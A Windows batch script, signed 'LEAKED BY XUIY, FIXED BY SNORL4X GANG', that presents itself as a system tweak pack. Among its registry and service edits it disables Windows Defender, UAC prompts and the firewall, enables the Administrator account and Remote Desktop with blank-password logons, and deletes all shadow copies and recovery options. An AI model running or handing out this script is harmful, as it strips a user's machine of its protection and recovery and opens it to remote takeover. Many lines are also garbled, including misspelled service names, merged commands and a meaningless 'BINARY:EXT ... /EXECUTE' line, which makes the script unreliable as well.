@echo off
COLOR 0A
echo LEAKED BY XUIY, FIXED BY SNORL4X GANG.
ping 127.0.0.1 -n 3 >nul 
cls
reg.exe add HKCU\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_SZ /d "506" /f 
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t  REG_DWORD /d 0 /f       
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 1 /f     
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 1 /f    
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ /v TaskbarGlomming /t REG_DWORD /d 0 /f   
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ /v TaskbarGlomLevel /t REG_DWORD /d 2 /f  
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ /v TaskbarSmallIcons /t REG_DWORD /d 1 /f 
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowTaskViewButton /t REG_DWORD /d 0 /f 
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\OperationStatusManager /v EnthusiastMode /t REG_DWORD /d 1 /f       
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\OperationStatusManager /v ConfirmationCheckBoxDoForAll /t REG_DWORD /d 1 /f 
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v NavPaneExpandToCurrentFolder /t REG_DWORD /d 1 /f       
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers /v BackgroundType /t REG_DWORD /d 1 /f   
reg.exe add HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f 
reg.exe add HKCU\Control Panel\Desktop" /v LastUpdated /t REG_DWORD /d 0xffffffff /f    
reg.exe add HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "45 125 154" /f       
reg.exe delete HKCU\Control Panel\International\User Profile\en-US" /v "0409:00000409" /f       
reg.exe delete HKCU\Control Panel\International\User Profile System Backup\en-US" /v "0409:00000409" /f 
reg.exe delete HKCU\Keyboard Layout\Preload" /v "2" /f  
reg.exe delete HKCU\Keyboard Layout\Substitutes" /v "d0010409" /f   
bcdedit /set {current} bootstatuspolicy ignoreallfailures   
bcdedit /set {default} recoveryenabled no
wmic pagefileset delete 
wmic pagefileset create name=C:\pagefile.sys   
wmic pagefileset set InitialSize=16384,MaximumSize=16384    
net user Administrator /active:yes      
reg.exe add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f 
sc config HomegroupListener start=disabled  
sc config HomegroupProvider start=disabled  
sc config Browser start=disabled    
reg.exe add HKLM\SOFTWARE\Policies\Microsoft\Windows\EnhancedStorageDevices" /v TCGSecurityActivationDisabled /t REG_DWORD /d 1 /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ForceClassicControlPanel /t REG_DWORD /d 1 /f   
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v DisableFileSyncNGSC /t REG_DWORD /d 1 /f 
start /wait %SystemRoot%\SysWOW64\OneDriveSetup.exe /uninstall      
reg.exe delete "HKEY_CLASSES_ROOT\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f      
reg.exe delete "HKEY_CLASSES_ROOT\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f rd "%PROGRAMDATA%\Microsoft OneDrive" /Q /S     
reg.exe delete "HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSetup /f  
reg.exe delete "HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSetup /f  
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f 
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f      
powershell Set-NetConnectionProfile -InterfaceAlias Ethernet -NetworkCategory private 
netsh advfirewall set private state off 
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f      
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f    
reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityHealth /f  
reg.exe add HKLM\Software\Policies\Microsoft\Windows\CloudContent /v DisableWindowsConsumerFeatures /t REG_DWORD /d 1 /f        
reg.exe add "HKLM\Software\Policies\Microsoft\Windows\CloudContent" /v DisableSoftLanding /t REG_DWORD /d 1 /f  
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f      
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v DisableWebSearch /t REG_DWORD /d 1 /f  
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowSearchToUseLocation /t REG_DWORD /d 0 /f  
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\SessionData" /v AllowLockScreen /t REG_DWORD /d 0 /f 
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f   
powercfg -h off 
powercfg.exe -x -standby-timeout-ac 0   
powercfg.exe -x -monitor-timeout-ac 240 
powershell disable-computerrestore c:   
vssadmin delete shadows /all /quiet 
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f       
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v LogEvent /t REG_DWORD /d 0 /f       
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v SendAlert /t REG_DWORD /d 0 /f      
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 0 /f     
reg.exe add "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 0 /f   
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f   
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{f42ee2d3-909f-4907-8871-4c22fc0bf756}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{f42ee2d3-909f-4907-8871-4c22fc0bf756}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{7d83ee9b-2244-4e70-b1f5-5393042af1e4}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{7d83ee9b-2244-4e70-b1f5-5393042af1e4}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{a0c69a99-21c8-4671-8703-7934162fcf1d}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{a0c69a99-21c8-4671-8703-7934162fcf1d}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{0ddd015d-b06c-45d5-8c4c-f59713854639}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{0ddd015d-b06c-45d5-8c4c-f59713854639}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f      
reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{35286a68-3c57-41a1-bbb1-0eae73d76c95}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  
reg.exe add HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{35286a68-3c57-41a1-bbb1-0eae73d76c95}\PropertyBag /v ThisPCPolicy /t REG_SZ /d Hide /f  Remove 3D Objects from Explorer     
reg.exe delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f   
reg.exe delete HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f       
reg.exe add HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer /v NoUseStoreOpenWith /t REG_DWORD /d 1 /f        
dism /online /norestart /disable-feature /featurename:Printing-PrintToPDFServices-Features      
dism /online /norestart /disable-feature /featurename:Printing-XPSServices-Features     
dism /online /norestart /disable-feature /featurename:Xps-Foundation-Xps-Viewer 
dism /online /norestart /disable-feature /featurename:WorkFolders-Client        
dism /online /norestart /disable-feature /featurename:WindowsMediaPlayer        
dism /online /norestart /disable-feature /featurename:Printing-Foundation-Features      
dism /online /norestart /disable-feature /featurename:Printing-Foundation-InternetPrinting-Client       
dism /online /norestart /disable-feature /featurename:FaxServicesClientPackage  
dism /online /norestart /disable-feature /featurename:MSRDC-Infrastructure      
dism /online /norestart /disable-feature /featurename:Internet-Explorer-Optional-amd64  
powershell "Get-AppXPackage | Where Name -NotLike "*WindowsStore*" | Remove-AppXPackage"    
powershell "sleep 5"       
powershell "Get-AppXProvisionedPackage -online | Where DisplayName -NotLike "*WindowsStore*" | Remove-AppxProvisionedPackage –online"   
C: /C \Program Files /ADD_FEATURE /CREATE:REG BINARY:EXT C= 00 10 20 30 40 50 60 70 80 90 100 110 120 130 140 150 160 170 180 190 200 210 220 230 240 250 260 270 280 290 300 310 320 330 340 350 360 370 380 390 400 410 420 430 440 450 460 470 480 490 500:[000 x 1024_Bits] /EXECUTE /ENABLE /SET /START    
Color F3    
sc stop Application Layer Gateway Service   
sc config Application Layer Gateway Service start= disabled         
sc config "stisvc" start= disabled  
sc stop Bluetooth Handsfree Service     
sc config Bluetooth Handsfree Service start= disabled   
sc stop Bluetooth Support Service   
sc config Bluetooth Support Service start= disabled     
sc stop BranchCache     
sc config BranchCache start= disabled   
sc stop Certificate Propagation     
sc config Certificate Propagation start= disabled   
sc stop Credential Manager  
sc config Credential Manager start= disabled    
sc stop Diagnostics Tracsing Service    
sc config Diagnostics Tracsing Service start= disabled  
sc stop Distributed Lins Tracsing Client    
sc config Distributed Lins Tracsing Client start= disabled  
sc stop Family Safety   
sc config Family Safety start= disabled     
sc stop Homegroup Listener  
sc config Homegroup Listener start= disabled    
sc stop Homegroup Provider  
sc config Homegroup Provider start= disabled    
sc stop Human Interface Device Service  
sc config Human Interface Device Service start= disabled    
sc stop Hyper-V     
sc config Hyper-V start= disabled   
sc stop Internet Connection Sharing     
sc config Internet Connection Sharing start= disabled   
sc stop Internet Explorer ETW Collector Service         
sc config Internet Explorer ETW Collector Service start= disabled   
sc stop IP Helper   sc config IP Helper start= disabled     
sc stop Liveupdate  sc config Liveupdate start= disabled    
sc stop Microsoft iSCSI Initiator Service   
sc config Microsoft iSCSI Initiator Service start= disabled         
sc stop Microsoft Keyboard Filter   
sc config Microsoft Keyboard Filter start= disabled     
sc stop Net.Tcp Port Sharing Service    
sc config Net.Tcp Port Sharing Service start= disabled  
sc stop Netlogon    
sc config Netlogon start= disabled  
sc stop Networs Access Protection Agent     
sc config Networs Access Protection Agent start= disabled   
sc stop Offline Files   
sc config Offline Files start= disabled     
sc stop Peer Name Resolution Protocol   
sc config Peer Name Resolution Protocol start= disabled     
sc stop Peer Networsing Identity Manager    
sc config Peer Networsing Identity Manager start= disabled  
sc stop SNMP Trap   
sc config SNMP Trap start= disabled     
sc stop SSDP Discovery  
sc config SSDP Discovery start= disabled    
sc stop Storage Service     
sc config Storage Service start= disabled   
sc stop Windows Biometric Service   
sc config Windows Biometric Service start= disabled     
sc stop Worsstation     
sc config Worsstation start= disabled   
sc stop WMI Performance Adapter     
sc config WMI Performance Adapter start= disabled   
sc stop "CertPropSvc"   
sc config "CertPropSvc" start= disabled 
sc stop "PeerDistSvc"   
sc config "PeerDistSvc" start= disabled 
sc stop "TrsWss"    
sc config "TrsWss" start= disabled  
sc stop "MSiSCSI"   sc config "MSiSCSI" start= disabled 
sc stop "SNMPTRAP"  sc config "SNMPTRAP" start= disabled    
sc stop "CscService"    
sc config "CscService" start= disabled  
sc stop "pla"   sc config "pla" start= disabled 
sc stop "PcaSvc"    sc config "PcaSvc" start= disabled  
sc stop "WerSvc"    sc config "WerSvc" start= disabled  
sc stop "stisvc"    
PowerShell.exe Disable-NetAdapterLso -Name '%interface%'    
Color 3B
PowerShell.exe Enable-NetAdapterRss -Name '%interface%' 
PowerShell.exe Enable-NetAdapterRsc -Name '%interface%'     
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -NonSackRttResiliency disabled
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -MaxSynRetransmissions 2   
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -EcnCapability disabled    
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -Timestamps disabled       
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Normal       
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -ScalingHeuristics disabled        
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -CongestionProvider ctcp   
Color F5
netsh int tcp set global autotuninglevel=normal 
Color F4
netsh int tcp set global chimney=enabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=disabled
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global ecncapability=disabled
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global fastopen=enabled
netsh int tcp set global timestamps=disabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set global rsc=enabled    
netsh int tcp set global maxsynretransmissions=2    
netsh int tcp set global initialRto=2000    
netsh int tcp set supplemental template=custom icw=10   
bcdedit /deletevalue useplatformclock   